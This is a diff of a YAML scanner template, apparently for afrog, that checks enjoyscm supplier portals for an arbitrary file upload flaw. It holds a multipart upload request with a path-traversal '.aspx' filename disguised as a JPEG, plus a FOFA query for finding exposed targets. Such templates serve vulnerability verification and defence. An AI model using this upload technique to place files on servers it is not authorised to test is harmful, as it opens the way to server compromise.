@@ -5,9 +5,11 @@ info:
   author: zan8in
   severity: high
   verified: true
-  description: |
+  description: |-
     enjoyscm是国内部分超市使用的一种供应链管理系统。enjoyscm UploadFile参数存在 任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
-    fofa：title="供应商网上服务厅"
+    fofa: title="供应商网上服务厅"
+  tags: enjoyscm,uploadfile
+  created: 2024/01/08
 
 set:
   randstr: randomLowercase(5)
@@ -21,20 +23,20 @@ rules:
       headers:
         Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
       body: "\
-          --WebKitFormBoundary{{rboundary}}\r\n\
-          Content-Disposition: form-data; name=\"file\"; filename=\"../../../{{randstr}}.aspx\"\r\n\
-          Content-Type: image/jpeg\r\n\
-          \r\n\
-          hello {{randbody}}\r\n\
-          --WebKitFormBoundary{{rboundary}}\r\n\
-          Content-Disposition: form-data; name=\"action\"\r\n\
-          \r\n\
-          unloadfile\r\n\
-          --WebKitFormBoundary{{rboundary}}\r\n\
-          Content-Disposition: form-data; name=\"filepath\"\r\n\
-          \r\n\
-          \r\n\
-          --WebKitFormBoundary{{rboundary}}--\r\n\
+        --WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"../../../{{randstr}}.aspx\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        hello {{randbody}}\r\n\
+        --WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"action\"\r\n\
+        \r\n\
+        unloadfile\r\n\
+        --WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"filepath\"\r\n\
+        \r\n\
+        \r\n\
+        --WebKitFormBoundary{{rboundary}}--\r\n\
         "
     expression: true
   r1:
